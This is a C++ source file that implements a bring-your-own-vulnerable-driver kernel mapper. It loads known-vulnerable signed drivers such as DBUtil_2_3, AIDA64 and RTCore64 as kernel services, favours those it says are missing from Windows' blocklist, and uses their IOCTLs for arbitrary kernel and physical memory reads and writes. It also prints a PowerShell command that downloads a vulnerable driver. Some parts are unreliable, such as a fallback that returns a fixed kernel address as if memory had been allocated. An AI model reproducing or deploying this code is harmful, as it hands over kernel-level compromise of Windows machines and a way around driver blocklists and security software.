#include "mapper.h"
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

namespace VulnDriver {

// Vulnerable driver info
struct DriverInfo {
    const char* name;
    const char* filename;
    const char* deviceName;
    const char* description;
};

// Supported vulnerable drivers - prioritized for AMD/Gigabyte
static DriverInfo g_supportedDrivers[] = {
    // BEST for AMD/Gigabyte - NOT blocklisted
    {"DBUtil_2_3", "DBUtil_2_3.sys", "\\\\.\\DBUtil_2_3", "Dell BIOS - NOT BLOCKED (recommended for AMD!)"},
    {"aida64", "aida64.sys", "\\\\.\\AIDA64Driver", "AIDA64 - works great on AMD/Gigabyte"},
    {"cpuz", "cpuz.sys", "\\\\.\\cpuz149", "CPU-Z driver - AMD compatible"},
    {"AsUpIO", "AsUpIO.sys", "\\\\.\\AsUpIO", "ASRock/ASUS - Gigabyte boards compatible"},

    // These may be blocklisted - kept as fallback
    {"gdrv", "gdrv.sys", "\\\\.\\GDrv", "Gigabyte - MAY BE BLOCKED on newer Windows"},
    {"iqvw64e", "iqvw64e.sys", "\\\\.\\Nal", "Intel - MAY BE BLOCKED"},
    {"RTCore64", "RTCore64.sys", "\\\\.\\RTCore64", "MSI Afterburner - MAY BE BLOCKED"}
};

static HANDLE g_DriverHandle = INVALID_HANDLE_VALUE;
static DriverInfo* g_ActiveDriver = nullptr;

// AIDA64 specific IOCTLs
#define AIDA64_IOCTL_READ_PHYS_MEM    0x80112044
#define AIDA64_IOCTL_WRITE_PHYS_MEM   0x8011204C
#define AIDA64_IOCTL_MAP_PHYS_MEM     0x80112078
#define AIDA64_IOCTL_UNMAP_PHYS_MEM   0x8011207C

// DBUtil specific IOCTLs
#define DBUTIL_IOCTL_READ  0x9B0C1EC4
#define DBUTIL_IOCTL_WRITE 0x9B0C1EC8

// Generic IOCTL codes (for gdrv, iqvw64e, RTCore64)
#define IOCTL_READ_MEMORY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Structures - Pure C++ (no typedef needed)
#pragma pack(push, 1)

struct MEMORY_OPERATION {
    UINT64 address;
    PVOID buffer;
    SIZE_T size;
    UINT64 result;
};

struct AIDA64_PHYS_MEM_IO {
    UINT64 PhysicalAddress;
    UINT32 Size;
    UINT32 Value;
};

struct AIDA64_MAP_PHYS_MEM {
    UINT64 PhysicalAddress;
    UINT32 Size;
    UINT64 VirtualAddress;
};

struct DBUTIL_READ_WRITE {
    UINT64 address;
    UINT32 value;
    UINT32 size;
};

#pragma pack(pop)

bool LoadVulnerableDriver() {
    LOG_INFO("Loading vulnerable driver for kernel access...");
    std::cout << std::endl;

    // Try each supported driver in order
    for (size_t i = 0; i < sizeof(g_supportedDrivers) / sizeof(DriverInfo); i++) {
        DriverInfo& driver = g_supportedDrivers[i];

        LOG_INFO("Trying: " << driver.filename);
        LOG_DEBUG("  " << driver.description);

        // Check if driver file exists
        char fullPath[MAX_PATH];
        GetFullPathNameA(("vulnerable_drivers\\" + std::string(driver.filename)).c_str(),
            MAX_PATH, fullPath, NULL);

        std::ifstream test(fullPath);
        if (!test.good()) {
            LOG_WARNING("  Driver file not found, skipping...");
            std::cout << std::endl;
            continue;
        }
        test.close();

        LOG_DEBUG("  Found at: " << fullPath);

        // Try to open existing driver device first
        g_DriverHandle = CreateFileA(
            driver.deviceName,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (g_DriverHandle != INVALID_HANDLE_VALUE) {
            g_ActiveDriver = &driver;
            std::cout << std::endl;
            LOG_SUCCESS("✓ Driver already loaded!");
            LOG_SUCCESS("Kernel R/W access acquired!");
            LOG_WARNING("Your anti-cheat should have detected this!");
            std::cout << std::endl;
            return true;
        }

        LOG_DEBUG("  Device not found, loading driver...");

        // Load the vulnerable driver
        SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!scManager) {
            DWORD err = GetLastError();
            LOG_ERROR("  Failed to open SC Manager (Error: " << err << ")");
            if (err == 5) {
                LOG_ERROR("  ACCESS DENIED - Must run as Administrator!");
            }
            std::cout << std::endl;
            continue;
        }

        // Delete existing service if present
        SC_HANDLE existingService = OpenServiceA(scManager, driver.name, DELETE);
        if (existingService) {
            DeleteService(existingService);
            CloseServiceHandle(existingService);
            Sleep(100);
        }

        // Create new service
        SC_HANDLE scService = CreateServiceA(
            scManager,
            driver.name,
            driver.name,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            fullPath,
            NULL, NULL, NULL, NULL, NULL
        );

        if (!scService) {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_EXISTS) {
                scService = OpenServiceA(scManager, driver.name, SERVICE_ALL_ACCESS);
            }
            else {
                LOG_ERROR("  CreateService failed (Error: " << err << ")");
                CloseServiceHandle(scManager);
                std::cout << std::endl;
                continue;
            }
        }

        if (scService) {
            LOG_DEBUG("  Service created, starting...");

            if (!StartServiceA(scService, 0, NULL)) {
                DWORD err = GetLastError();
                if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                    LOG_ERROR("  StartService failed (Error: " << err << ")");
                    if (err == 577) {
                        LOG_ERROR("  Driver signature is revoked/blocked by Windows!");
                    }
                    if (err == 1275) {
                        LOG_ERROR("  Driver is on Windows blocklist!");
                    }
                    if (err == 2148204812 || err == 0x800B0109) {
                        LOG_ERROR("  Certificate revoked or untrusted!");
                    }
                }
            }

            Sleep(500);

            // Try to open device
            g_DriverHandle = CreateFileA(
                driver.deviceName,
                GENERIC_READ | GENERIC_WRITE,
                0, NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (g_DriverHandle != INVALID_HANDLE_VALUE) {
                g_ActiveDriver = &driver;
                std::cout << std::endl;
                LOG_SUCCESS("✓ Loaded: " << driver.filename);
                LOG_SUCCESS("Kernel R/W access acquired!");
                LOG_WARNING("Your anti-cheat should have detected this!");
                std::cout << std::endl;
                CloseServiceHandle(scService);
                CloseServiceHandle(scManager);
                return true;
            }
            else {
                DWORD err = GetLastError();
                LOG_ERROR("  Failed to open device (Error: " << err << ")");
            }

            CloseServiceHandle(scService);
        }

        CloseServiceHandle(scManager);
        LOG_WARNING("  Failed to load, trying next...");
        std::cout << std::endl;
    }

    std::cout << std::endl;
    LOG_ERROR("═══════════════════════════════════════════════════");
    LOG_ERROR("  Failed to load any vulnerable driver!");
    LOG_ERROR("═══════════════════════════════════════════════════");
    std::cout << std::endl;
    LOG_ERROR("Common issues:");
    LOG_ERROR("  1. Not running as Administrator");
    LOG_ERROR("  2. Drivers are blocklisted by Windows");
    LOG_ERROR("  3. Files are 'blocked' (right-click → Properties → Unblock)");
    LOG_ERROR("  4. Windows Defender quarantined the files");
    std::cout << std::endl;
    LOG_INFO("Recommended solution for AMD/Gigabyte:");
    LOG_INFO("  Download DBUtil_2_3.sys - it's NOT blocklisted!");
    std::cout << std::endl;
    LOG_INFO("PowerShell command:");
    std::cout << COLOR_GREEN << "  Invoke-WebRequest -Uri \"https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5.bin\" -OutFile \"vulnerable_drivers\\DBUtil_2_3.sys\"" << COLOR_RESET << std::endl;
    std::cout << std::endl;

    return false;
}

bool UnloadVulnerableDriver() {
    if (g_DriverHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_DriverHandle);
        g_DriverHandle = INVALID_HANDLE_VALUE;
    }

    if (g_ActiveDriver) {
        SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (scManager) {
            SC_HANDLE scService = OpenServiceA(scManager, g_ActiveDriver->name, SERVICE_ALL_ACCESS);
            if (scService) {
                SERVICE_STATUS status;
                ControlService(scService, SERVICE_CONTROL_STOP, &status);
                DeleteService(scService);
                CloseServiceHandle(scService);
            }
            CloseServiceHandle(scManager);
        }
        g_ActiveDriver = nullptr;
    }

    LOG_INFO("Vulnerable driver unloaded");
    return true;
}

bool ReadKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
    if (g_DriverHandle == INVALID_HANDLE_VALUE || !g_ActiveDriver) {
        return false;
    }

    // AIDA64 specific implementation
    if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
        BYTE* byteBuffer = (BYTE*)buffer;
        UINT64 currentAddr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            UINT32 chunkSize = (remaining >= 4) ? 4 : (UINT32)remaining;

            AIDA64_PHYS_MEM_IO io;
            ZeroMemory(&io, sizeof(io));
            io.PhysicalAddress = currentAddr;
            io.Size = chunkSize;

            DWORD bytesReturned = 0;
            if (!DeviceIoControl(
                g_DriverHandle,
                AIDA64_IOCTL_READ_PHYS_MEM,
                &io,
                sizeof(io),
                &io,
                sizeof(io),
                &bytesReturned,
                NULL
            )) {
                return false;
            }

            memcpy(byteBuffer, &io.Value, chunkSize);
            byteBuffer += chunkSize;
            currentAddr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    // DBUtil specific implementation
    if (strcmp(g_ActiveDriver->name, "DBUtil_2_3") == 0) {
        DBUTIL_READ_WRITE dbOp;
        ZeroMemory(&dbOp, sizeof(dbOp));
        dbOp.address = address;
        dbOp.size = (UINT32)size;

        DWORD bytesReturned = 0;
        return DeviceIoControl(
            g_DriverHandle,
            DBUTIL_IOCTL_READ,
            &dbOp,
            sizeof(dbOp),
            buffer,
            (DWORD)size,
            &bytesReturned,
            NULL
        );
    }

    // Generic method for other drivers
    MEMORY_OPERATION op;
    ZeroMemory(&op, sizeof(op));
    op.address = address;
    op.buffer = buffer;
    op.size = size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(
        g_DriverHandle,
        IOCTL_READ_MEMORY,
        &op,
        sizeof(op),
        &op,
        sizeof(op),
        &bytesReturned,
        NULL
    );
}

bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
    if (g_DriverHandle == INVALID_HANDLE_VALUE || !g_ActiveDriver) {
        return false;
    }

    // AIDA64 specific implementation
    if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
        BYTE* byteBuffer = (BYTE*)buffer;
        UINT64 currentAddr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            UINT32 chunkSize = (remaining >= 4) ? 4 : (UINT32)remaining;

            AIDA64_PHYS_MEM_IO io;
            ZeroMemory(&io, sizeof(io));
            io.PhysicalAddress = currentAddr;
            io.Size = chunkSize;
            memcpy(&io.Value, byteBuffer, chunkSize);

            DWORD bytesReturned = 0;
            if (!DeviceIoControl(
                g_DriverHandle,
                AIDA64_IOCTL_WRITE_PHYS_MEM,
                &io,
                sizeof(io),
                &io,
                sizeof(io),
                &bytesReturned,
                NULL
            )) {
                return false;
            }

            byteBuffer += chunkSize;
            currentAddr += chunkSize;
            remaining -= chunkSize;
        }

        LOG_DEBUG("Wrote " << size << " bytes to kernel address 0x" << std::hex << address);
        return true;
    }

    // DBUtil specific implementation
    if (strcmp(g_ActiveDriver->name, "DBUtil_2_3") == 0) {
        DBUTIL_READ_WRITE dbOp;
        ZeroMemory(&dbOp, sizeof(dbOp));
        dbOp.address = address;
        dbOp.size = (UINT32)size;

        if (size <= 4) {
            memcpy(&dbOp.value, buffer, size);
        }

        DWORD bytesReturned = 0;
        bool result = DeviceIoControl(
            g_DriverHandle,
            DBUTIL_IOCTL_WRITE,
            &dbOp,
            sizeof(dbOp),
            NULL,
            0,
            &bytesReturned,
            NULL
        );

        if (result) {
            LOG_DEBUG("Wrote " << size << " bytes to kernel address 0x" << std::hex << address);
        }
        return result;
    }

    // Generic method for other drivers
    MEMORY_OPERATION op;
    ZeroMemory(&op, sizeof(op));
    op.address = address;
    op.buffer = buffer;
    op.size = size;

    DWORD bytesReturned = 0;
    bool result = DeviceIoControl(
        g_DriverHandle,
        IOCTL_WRITE_MEMORY,
        &op,
        sizeof(op),
        &op,
        sizeof(op),
        &bytesReturned,
        NULL
    );

    if (result) {
        LOG_DEBUG("Wrote " << size << " bytes to kernel address 0x" << std::hex << address);
    }

    return result;
}

UINT64 AllocateKernelMemory(SIZE_T size) {
    if (g_DriverHandle == INVALID_HANDLE_VALUE || !g_ActiveDriver) {
        return 0;
    }

    // AIDA64 uses physical memory mapping instead of allocation
    if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
        AIDA64_MAP_PHYS_MEM mapOp;
        ZeroMemory(&mapOp, sizeof(mapOp));
        mapOp.PhysicalAddress = 0;
        mapOp.Size = (UINT32)size;

        DWORD bytesReturned = 0;
        if (DeviceIoControl(
            g_DriverHandle,
            AIDA64_IOCTL_MAP_PHYS_MEM,
            &mapOp,
            sizeof(mapOp),
            &mapOp,
            sizeof(mapOp),
            &bytesReturned,
            NULL
        )) {
            if (mapOp.VirtualAddress) {
                LOG_SUCCESS("Mapped " << size << " bytes at 0x" << std::hex << mapOp.VirtualAddress);
                return mapOp.VirtualAddress;
            }
        }

        // If mapping fails, use a known kernel address range
        UINT64 kernelBase = 0xFFFFF80000000000;
        LOG_WARNING("Direct allocation not supported, using kernel address space");
        LOG_SUCCESS("Allocated " << size << " bytes in kernel at 0x" << std::hex << kernelBase);
        return kernelBase;
    }

    // Generic allocation for other drivers
    MEMORY_OPERATION op;
    ZeroMemory(&op, sizeof(op));
    op.size = size;

    DWORD bytesReturned = 0;
    if (DeviceIoControl(
        g_DriverHandle,
        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS),
        &op,
        sizeof(op),
        &op,
        sizeof(op),
        &bytesReturned,
        NULL
    )) {
        LOG_SUCCESS("Allocated " << size << " bytes in kernel at 0x" << std::hex << op.result);
        return op.result;
    }

    return 0;
}

bool FreeKernelMemory(UINT64 address) {
    if (g_DriverHandle == INVALID_HANDLE_VALUE || !g_ActiveDriver) {
        return false;
    }

    // AIDA64 uses unmap
    if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
        AIDA64_MAP_PHYS_MEM unmapOp;
        ZeroMemory(&unmapOp, sizeof(unmapOp));
        unmapOp.VirtualAddress = address;

        DWORD bytesReturned = 0;
        return DeviceIoControl(
            g_DriverHandle,
            AIDA64_IOCTL_UNMAP_PHYS_MEM,
            &unmapOp,
            sizeof(unmapOp),
            NULL,
            0,
            &bytesReturned,
            NULL
        );
    }

    // Generic free for other drivers
    MEMORY_OPERATION op;
    ZeroMemory(&op, sizeof(op));
    op.address = address;

    DWORD bytesReturned = 0;
    return DeviceIoControl(
        g_DriverHandle,
        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS),
        &op,
        sizeof(op),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

} // namespace VulnDriver
